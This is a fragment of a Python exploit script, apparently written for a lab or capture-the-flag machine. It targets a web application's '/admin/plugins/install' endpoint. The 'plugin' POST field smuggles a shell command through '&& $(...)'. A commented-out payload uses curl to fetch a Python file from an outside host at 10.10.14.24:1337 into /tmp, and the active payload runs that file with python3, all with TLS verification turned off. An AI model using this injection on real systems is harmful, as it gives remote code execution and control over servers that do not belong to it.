...
if __name__ == '__main__':
	...
	# Exploit run
		...
		r = s.post(url, verify=False, proxies=proxies) # SSL == verify=True
		...
		# postData = {
		# 	"plugin":"documentation && $(curl http://10.10.14.24:1337/python3.py > /tmp/python3.py)"
		# }

		postData = {
			"plugin":"documentation && $(python3 /tmp/python3.py)"
		}                
		...
		try:
			...
			r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData, verify=False, proxies=proxies) # SSL == verify=True
			# Content print
			print(r.text)
		except:
